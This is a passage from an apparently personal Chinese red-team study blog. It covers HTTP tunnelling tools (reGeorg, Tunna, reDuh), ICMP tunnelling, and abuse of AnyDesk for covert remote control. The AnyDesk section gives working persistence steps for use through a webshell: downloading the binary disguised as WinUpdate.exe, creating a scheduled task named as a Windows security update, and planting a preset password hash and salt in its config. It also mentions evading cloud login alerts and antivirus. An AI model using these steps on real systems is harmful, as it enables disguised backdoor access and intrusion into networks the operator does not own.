class="hljs-selector-tag">-f</span> 192.168.1.101<span class="hljs-selector-pseudo">:33389</span>/192.168.126.170<span class="hljs-selector-pseudo">:3389</span></code></pre><p>然后连接<code>192.168.1.101:33389</code>即可，挺卡的。<br>![连接3389红队攻防/20201221_命令与控制/02.png)</p><p><code>提示目前不支持PHP</code></p><ul><li><a href="https://micro8.gitbook.io/micro8/contents-1/91-100/96http-sui-dao-abptts-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/96http-sui-dao-abptts-di-yi-ji</a></li></ul><hr><h2 id="2、HTTP-隧道-reGeorg"><a href="#2、HTTP-隧道-reGeorg" class="headerlink" title="2、HTTP 隧道 reGeorg"></a>2、HTTP 隧道 reGeorg</h2><p>reGeorg 的前身是2008年 SensePost 在 BlackHat USA 2008 的 reDuh 延伸与扩展。也是目前安全从业人员使用最多，范围最广，支持多丰富的一款 http 隧道。从本质上讲，可以将 JSP/PHP/ASP/ASPX 等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p><strong>2014年blackhat介绍</strong></p><ul><li><a href="https://www.blackhat.com/eu-14/arsenal.html#regeorg">https://www.blackhat.com/eu-14/arsenal.html#regeorg</a></li></ul><p><strong>Github：</strong></p><ul><li><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li></ul><p><strong>环境</strong></p><pre><code class="hljs accesslog">靶机：<span class="hljs-number">192.168.126.170</span> 外网IP<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装</strong></p><pre><code class="hljs bash">root@John:~<span class="hljs-comment"># git clone https://github.com/sensepost/reGeorg.git</span>Cloning into <span class="hljs-string">&#x27;reGeorg&#x27;</span>...remote: Enumerating objects: 85, <span class="hljs-keyword">done</span>.remote: Total 85 (delta 0), reused 0 (delta 0), pack‐reused 85Unpacking objects: 100% (85/85), <span class="hljs-keyword">done</span>.root@John:~<span class="hljs-comment"># cd reGeorg/</span>root@John:~reGeorg<span class="hljs-comment"># ls</span>LICENSE.html LICENSE.txt README.md reGeorgSocksProxy.py tunnel.ashx tunnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsproot@John:~/reGeorg<span class="hljs-comment"># python reGeorgSocksProxy.py ‐h</span>__________ ______ __|___ |__ ______ _____ _____ ______| | | ___|| ___| || ___|/ \| | | ___|| \ | ___|| | | || ___|| || \ | | ||__|\__\|______||______| __||______|\_____/|__|\__\|______||_____|... every office needs a tool like Georg willem@sensepost.com / @_w_m__sam@sensepost.com / @trowaltsetienne@sensepost.com / @kamp_staaldraad usage: reGeorgSocksProxy.py [‐h] [‐l] [‐p] [‐r] ‐u [‐v] Socks server <span class="hljs-keyword">for</span> reGeorg HTTP(s) tunneller optional arguments:‐h, ‐‐<span class="hljs-built_in">help</span> show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span>‐l , ‐‐listen‐on The default listening address‐p , ‐‐listen‐port The default listening port‐r , ‐‐<span class="hljs-built_in">read</span>‐buff Local <span class="hljs-built_in">read</span> buffer, max data to be sent per POST‐u , ‐‐url The url containing the tunnel script‐v , ‐‐verbose Verbose output[INFO\|DEBUG]</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/03.png" alt="demo"></p><p><strong>攻击机执行：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">reGeorgSocksProxy</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-p</span> 8080 <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">http</span>://192.168.126.170<span class="hljs-selector-pseudo">:8031</span>/<span class="hljs-selector-tag">tunnel</span><span class="hljs-selector-class">.aspx</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/04.png" alt="运行"><br><strong>Windows下配合Proxifier：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/05.png" alt="Proxifier"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/06.png" alt="使用内网IP连接服务器"><br>目前大部分waf都会针对默认原装版本的reGeorg</p><ul><li><a href="https://micro8.gitbook.io/micro8/contents-1/91-100/98http-sui-dao-regeorg-di-er-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/98http-sui-dao-regeorg-di-er-ji</a></li></ul><hr><h2 id="3、HTTP-隧道-Tunna"><a href="#3、HTTP-隧道-Tunna" class="headerlink" title="3、HTTP 隧道 Tunna"></a>3、HTTP 隧道 Tunna</h2><p><strong>Tunna简介：</strong></p><p>Tunna1.1 是 secforce 在2014年11月出品的一款基于HTTP隧道工具。其中v1.1中支持了SOCKS4a。</p><p><strong>Tunna演示稿：</strong></p><ul><li><a href="https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE">https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE</a></li></ul><p><strong>Github：</strong></p><ul><li><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></li></ul><p><strong>环境：</strong></p><pre><code class="hljs accesslog">攻击机<span class="hljs-number">192.168.1.101</span>靶机<span class="hljs-number">192.168.126.170</span> 外网IP<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@John:~# git clone https://github.com/SECFORCE/Tunna.git<span class="hljs-attribute">Cloning</span> into &#x27;Tunna&#x27;...<span class="hljs-attribute">remote</span>: Enumerating objects: <span class="hljs-number">6</span>, done.<span class="hljs-attribute">remote</span>: Counting objects: <span class="hljs-number">100</span>% (<span class="hljs-number">6</span>/<span class="hljs-number">6</span>), done.<span class="hljs-attribute">remote</span>: Compressing objects: <span class="hljs-number">100</span>% (<span class="hljs-number">6</span>/<span class="hljs-number">6</span>), done.<span class="hljs-attribute">remote</span>: Total <span class="hljs-number">156</span> (delta <span class="hljs-number">0</span>), reused <span class="hljs-number">2</span> (delta <span class="hljs-number">0</span>), pack‐reused <span class="hljs-number">150</span><span class="hljs-attribute">Receiving</span> objects: <span class="hljs-number">100</span>% (<span class="hljs-number">156</span>/<span class="hljs-number">156</span>), <span class="hljs-number">8</span>.<span class="hljs-number">93</span> MiB | <span class="hljs-number">25</span>.<span class="hljs-number">00</span> KiB/s, done.<span class="hljs-attribute">Resolving</span> deltas: <span class="hljs-number">100</span>% (<span class="hljs-number">84</span>/<span class="hljs-number">84</span>), done.</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/07.png" alt="demo"><br><strong>攻击机执行：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">py</span> -<span class="hljs-number">2</span> proxy.py -u http://<span class="hljs-number">192.168.126.170:8031</span>/conn.aspx -l <span class="hljs-number">1234</span> -r <span class="hljs-number">3389</span> -s -v</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/08.png" alt="执行"><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/09.png" alt="连接"><br><strong>附录：</strong><br>解决：<code>General Exception: [Errno 104] Connection reset by peer</code></p><pre><code class="hljs angelscript"><span class="hljs-string">[+]</span> Spawning keep‐alive thread<span class="hljs-string">[‐]</span> Keep‐alive thread <span class="hljs-keyword">not</span> required<span class="hljs-string">[+]</span> Checking <span class="hljs-keyword">for</span> proxy: False</code></pre><p>连接后，出现</p><pre><code class="hljs pgsql">General <span class="hljs-keyword">Exception</span>: [Errno <span class="hljs-number">104</span>] <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">reset</span> <span class="hljs-keyword">by</span> peer</code></pre><p>等待出现：无法验证此远程计算机的身份，是否仍要连接？</p><p>再次运行，在点击是(Y)</p><pre><code class="hljs apache"><span class="hljs-attribute">py</span> -<span class="hljs-number">2</span> proxy.py -u http://<span class="hljs-number">192.168.126.170:8031</span>/conn.aspx -l <span class="hljs-number">1234</span> -r <span class="hljs-number">3389</span> -s -v</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/10.png" alt="解决报错"></p><p>如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”</p><p>注册表键值：<code> HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code> 删除对应IP键值即可。</p><p>Tunna对PHP的支持并不是太友好</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">91</span>-<span class="hljs-number">100</span>/<span class="hljs-number">99</span>http-sui-dao-tunna-di-san-ji</code></pre><hr><h2 id="4、HTTP-隧道-reDun"><a href="#4、HTTP-隧道-reDun" class="headerlink" title="4、HTTP 隧道 reDun"></a>4、HTTP 隧道 reDun</h2><p><strong>reDuh简介：</strong></p><p>reDuh是sensepost由2008-07年发布，从本质上讲，可以将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p><strong>BlackHat USA 2008介绍：</strong></p><ul><li><a href="https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-">https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-</a></li></ul><p><strong>reDuh使用条件</strong></p><p>（1）获取目标服务器webshell，且可以上传reDuh服务端对应脚本文件。</p><p>（2）知道目标服务器开放的内网端口，如远程桌面的端口是3389。</p><p>（3）目标服务器网络做了端口策略限制，只允许外部访问内网的80等特定端口。</p><p><strong>Github：</strong></p><ul><li><a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></li></ul><p><strong>环境：</strong></p><pre><code class="hljs accesslog">攻击机<span class="hljs-number">192.168.1.101</span>靶机<span class="hljs-number">192.168.126.170</span> 外网IP<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装：</strong></p><pre><code class="hljs elixir">root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># git clone https://github.com/sensepost/reDuh.git</span>Cloning into <span class="hljs-string">&#x27;reDuh&#x27;</span>...<span class="hljs-symbol">remote:</span> Enumerating <span class="hljs-symbol">objects:</span> <span class="hljs-number">47</span>, done.<span class="hljs-symbol">remote:</span> Total <span class="hljs-number">47</span> (delta 0), reused 0 (delta 0), pack‐reused <span class="hljs-number">47</span>Unpacking <span class="hljs-symbol">objects:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">47/47</span>), done.root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cd reDuh/</span>root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~/reDuh</span><span class="hljs-comment"># ls</span>README.markdown reDuhClient reDuhServers</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/11.png" alt="demo"><br><strong>攻击机执行：</strong></p><p>绑定端口：</p><pre><code class="hljs bash">$ java -jar reDuhClient.jar http://192.168.126.170:8031/reDuh.aspx host:3389[Info]Using Proxy: host:3389[Info]Querying remote web page <span class="hljs-keyword">for</span> usable remote service port[Info]Remote RPC port chosen as 42000[Info]Attempting to start reDuh from 192.168.126.170:8031/reDuh.aspx.  Using service port 42000. Please <span class="hljs-built_in">wait</span>...[Info]*********************************************************[Info]***                 Using proxy                       ***[Info]*********************************************************[Info]*** We<span class="hljs-string">&#x27;ll not know whether reDuh started successfully ***</span><span class="hljs-string">[Info]*** Starting ReDuh now and lets hope for the best...  ***</span><span class="hljs-string">[Info]*********************************************************</span><span class="hljs-string">[Info]reDuhClient service listener started on local port 1010</span></code></pre><p>开启新terminal，建立隧道</p><p><strong>命令如下：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">telnet</span> 127.0.0.1 1010然后执行<span class="hljs-selector-attr">[createTunnel]</span>1234<span class="hljs-selector-pseudo">:127.0.0.1</span><span class="hljs-selector-pseudo">:3389</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/13.png" alt="执行"></p><p>访问本地1234端口，既等价于访问靶机3389端口</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/14.png" alt="连接"><br>遗憾的是reDuh年代久远，使用繁琐，并官方已停止维护。但是它奠定了HTTP隧道</p><ul><li><a href="https://micro8.gitbook.io/micro8/contents-1/91-100/100http-sui-dao-reduh-di-si-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/100http-sui-dao-reduh-di-si-ji</a></li></ul><hr><h2 id="5、基于-Ptunnel-建立ICMP隧道（没复现）"><a href="#5、基于-Ptunnel-建立ICMP隧道（没复现）" class="headerlink" title="5、基于 Ptunnel 建立ICMP隧道（没复现）"></a>5、基于 Ptunnel 建立ICMP隧道（没复现）</h2><p><strong>前言</strong></p><p>在某些渗透测试环境下，获得了一个主机的权限但是该主机没有访问外网的权限，对于这种较为严格的网络环境，第一时间想到的就是隧道技术。常见的隧道技术有SSH\DNS\ICMP\端口转发等，大多数端口都存在被禁用的可能，但是ICMP作为基础服务被禁用的可能性却极小，在常用协议都被禁用的情况下可以考虑使用ICMP隧道。</p><p><strong>网络拓扑</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/15.png" alt="网络拓扑"><br>内网主机10.10.10.0/24除了ICMP通讯不能主动访问外网任何资源，20.20.20.101为hack的ICMP隧道服务端</p><p><strong>可以参考</strong></p><ul><li><a href="https://www.bilibili.com/video/BV1s54y1X7i4">https://www.bilibili.com/video/BV1s54y1X7i4</a></li></ul><hr><h2 id="6、使用anydesk做远控（没复现）"><a href="#6、使用anydesk做远控（没复现）" class="headerlink" title="6、使用anydesk做远控（没复现）"></a>6、使用anydesk做远控（没复现）</h2><p>anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小</p><p><strong>场景举例</strong></p><p>1）有云锁，护卫神等禁止3389登录时<br>2）类似阿里云这种，登录3389会报警<br>3）连接内网中可以出网的windows机器</p><p><strong>注意事项</strong></p><p>1）启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都是没有桌面用户权限的，如果启动anydesk不会成功</p><p>2）启动anydesk时桌面不能被注销</p><p>3）有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用<br>winlogon启动anydesk，否则没法使用屏幕</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.zhihuifly.com<span class="hljs-regexp">/t/</span>topic/<span class="hljs-number">1121</span>https:<span class="hljs-regexp">//</span><span class="hljs-number">422926799</span>.github.io<span class="hljs-regexp">/posts/</span><span class="hljs-number">6</span>b1dcf8a.html</code></pre><p>这里是还有很骚气的方法，往后在亲自复现…</p><hr><p>复现另外的方法…</p><p><strong>AnyDesk利用</strong></p><p>AnyDesk 是一款声称速度最快的免费长途衔接/长途桌面操控软件，据说是前 TeamViewer 开发小组人员自立门户的商品，它拥有领先的视频压缩技能 DeskRT， 能够轻松穿透防火墙/路由器。 重点是不用安装，而且体积只有2,917KB。<br>镜外诈骗人员使用修改版本做为远控，发给受害人获取控制电脑权限。</p><p>本地anydesk设置自主访问密码，然后生成的配置文件放到目标中，这样只要获取ad.anynet.id即可连接。收费版支持命令行反回ad.anynet.id与设置密码。不需要像免费版这么复杂。</p><p><strong>使用场景</strong></p><pre><code class="hljs armasm">云锁，护卫神等禁止<span class="hljs-number">3389</span>登录绕过；阿里云登录<span class="hljs-number">3389</span>则会<span class="hljs-built_in">IP</span>报警提示绕过；内网穿透机器、传输文件等；白名单软件过全世界所有杀软、流量加密；<span class="hljs-symbol">BlackRouter</span>勒索软件通过AnyDesk捆绑进行传播；</code></pre><p><strong>支持操作系统</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Windows</span><span class="hljs-attribute">MacOS</span><span class="hljs-attribute">Android</span><span class="hljs-attribute">IOS</span><span class="hljs-attribute">Linux</span><span class="hljs-attribute">FreeBSD</span><span class="hljs-attribute">Raspberry Pi</span><span class="hljs-attribute">Chrome OS</span></code></pre><p><strong>利用条件</strong></p><pre><code class="hljs plain">桌面用户权anydesk时桌面不能被注</code></pre><p><strong>首先本机生成密码:</strong><br><img src="https://img-blog.csdnimg.cn/20200927205157982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>配置文件将会保存在：<br><img src="https://img-blog.csdnimg.cn/2020092720521626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>service.conf存放</p><pre><code class="hljs css"><span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.pwd_hash</span>与<span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.pwd_salt</span>提取出来。</code></pre><p>system.conf存放：</p><pre><code class="hljs css"><span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.id</span></code></pre><p>Webshell中将Anydesk上传受害者机器，运行一遍Anydesk，然后kill掉</p><pre><code class="hljs awk">taskkill <span class="hljs-regexp">/F /</span>IM AnyDesk.exe</code></pre><p>在进入到</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\&#123;</span>username&#125;<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\A</span>nyDesk</code></pre><p>路径把以上两个配置写入到service.conf文件下</p><p>连接</p><p>命令复现</p><pre><code class="hljs css"><span class="hljs-selector-tag">powershelgl</span><span class="hljs-selector-class">.exe</span> &quot;(<span class="hljs-selector-tag">New-Object</span> <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.WebClient</span>)<span class="hljs-selector-class">.DownloadFile</span>(\&quot;<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">download</span><span class="hljs-selector-class">.anydesk</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">AnyDesk</span><span class="hljs-selector-class">.exe</span>\&quot;,\&quot;<span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">inetpub</span>\<span class="hljs-selector-tag">wwwroot</span>\<span class="hljs-selector-tag">WinUpdate</span><span class="hljs-selector-class">.exe</span>\&quot;)&quot;</code></pre><p>确定有哪些用户当前正在使用桌面：</p><pre><code class="hljs lsl">powershelgl.exe <span class="hljs-string">&quot;(((Get-WmiObject -Class Win32_Process -Filter &#x27;Name=<span class="hljs-subst">\&quot;</span>explorer.exe<span class="hljs-subst">\&quot;</span>&#x27;).GetOwner().User) -split &#x27;<span class="hljs-subst">\n</span>&#x27;)&quot;</span></code></pre><p>创建一个计划任务:</p><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/Create</span> <span class="hljs-string">/TN</span> Windows_Security_Update <span class="hljs-string">/SC</span> monthly <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;C:\inetpub\wwwroot\WinUpdate.exe&quot;</span> <span class="hljs-string">/RU</span> administrator</code></pre><p>先执行一次生成配置文件：</p><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>tn Windows_Security_Update</code></pre><p>结束掉进程：</p><pre><code class="hljs awk">taskkill <span class="hljs-regexp">/F /</span>IM WinUpdate.exe</code></pre><p>添加密码</p><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> ad.anynet.pwd_hash=a<span class="hljs-number">7</span>f<span class="hljs-number">9</span>ef<span class="hljs-number">816567</span>ddeb<span class="hljs-number">071</span>c<span class="hljs-number">985771698</span>c<span class="hljs-number">70</span>a<span class="hljs-number">6</span>aec<span class="hljs-number">4</span>c<span class="hljs-number">70</span>dc<span class="hljs-number">284943</span>b<span class="hljs-number">3104</span>dcc<span class="hljs-number">06</span>b<span class="hljs-number">8184</span> &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf<span class="hljs-attribute">echo</span> ad.anynet.pwd_salt=<span class="hljs-number">5</span>afbd<span class="hljs-number">8</span>fc<span class="hljs-number">7334032</span>ddbddd<span class="hljs-number">489363</span>e<span class="hljs-number">25</span>f<span class="hljs-number">8</span> &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf</code></pre><p>利用需要一定条件，除此之外也需要考虑WebShell免杀。</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.moonsec.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">1098</span>   --云渗透思路</code></pre><hr><h2 id="7、Kerberos域内委派攻击（重要了解）"><a href="#7、Kerberos域内委派攻击（重要了解）" class="headerlink" title="7、Kerberos域内委派攻击（重要了解）"></a>7、Kerberos域内委派攻击（重要了解）</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7217</span>   --域渗透——Kerberos委派攻击https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7517</span>   --Kerberos之域内委派攻击https:<span class="hljs-regexp">//</span><span class="hljs-number">422926799</span>.github.io<span class="hljs-regexp">/posts/</span><span class="hljs-number">4</span>d3be28.html    --跟着先知社区复现文章https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/backlion/</span>p/<span class="hljs-number">10537813</span>.html  --老文章思路https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">166934</span>   --攻击活动目录：无约束委派及域林信任https:<span class="hljs-regexp">//</span>shenaniganslabs.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">01</span><span class="hljs-regexp">/28/</span>Wagging-the-Dog.html   --最详细的介绍，有视频，但是全英文，感谢大佬</code></pre><p>认真看完，就能熟悉了…</p><hr><h2 id="8、ATT-amp-CK攻防初窥系列-执行篇"><a href="#8、ATT-amp-CK攻防初窥系列-执行篇" class="headerlink" title="8、ATT&amp;CK攻防初窥系列-执行篇"></a>8、ATT&amp;CK攻防初窥系列-执行篇</h2><pre><code class="hljs css"><span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-9787</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">--ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>执行篇（一）<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-10014</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">---ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>执行篇（二）<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-9857</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">---ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>横向移动篇（一）</code></pre><p>感谢看雪大佬！！</p><hr><h2 id="9、Powershell"><a href="#9、Powershell" class="headerlink" title="9、Powershell"></a>9、Powershell</h2><h3 id="利用360正则不严执行-powershell上线"><a href="#利用360正则不严执行-powershell上线" class="headerlink" title="利用360正则不严执行 powershell上线"></a>利用360正则不严执行 powershell上线</h3><p>powershell无文件利用自blackhat演讲至今已经过去近5年,将来的日子会越来越不好过，windows的审计会越来越细，以后将是.NET的天下。从CS推荐使用.NET内存加载开始就已经慢慢变成红队的主流（execute-assembly）</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7903</span>   --感谢大佬的思路和技术，<span class="hljs-number">6</span>月份最新的复现https:<span class="hljs-regexp">//</span>www.chabug.org<span class="hljs-regexp">/web/</span><span class="hljs-number">1324</span>.html   --感谢s1ye大佬</code></pre><p>书中还有更好的思路，找时间按照书里的复现写出来…</p><hr><h3 id="关于-Powershell抗安全软件"><a href="#关于-Powershell抗安全软件" class="headerlink" title="关于 Powershell抗安全软件"></a>关于 Powershell抗安全软件</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.kanxue.com/book-<span class="hljs-number">38</span>-<span class="hljs-number">473</span>.htm   --看雪高级渗透课堂！https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">36250656</span>   --原文</code></pre><p>参考</p><ul><li><a href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff629472(v=msdn.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff629472(v=msdn.10)?redirectedfrom=MSDN</a></li><li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li></ul><hr><h3 id="Invoke-Obfuscation介绍"><a href="#Invoke-Obfuscation介绍" class="headerlink" title="Invoke-Obfuscation介绍"></a>Invoke-Obfuscation介绍</h3><ul><li><a href="https://buaq.net/go-23754.html">https://buaq.net/go-23754.html</a>   –powershell配合Invoke-Obfuscation</li><li><a href="https://www.anquanke.com/post/id/86637">https://www.anquanke.com/post/id/86637</a>    –powershell 混淆</li><li><a href="https://cloud.tencent.com/developer/article/1044940">https://cloud.tencent.com/developer/article/1044940</a>   –Powershell编码与混淆</li></ul>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队攻防学习之打点进内网</title>
    <link href="/p/28ca3946.html"/>
    <url>/p/28ca3946.html</url>
    
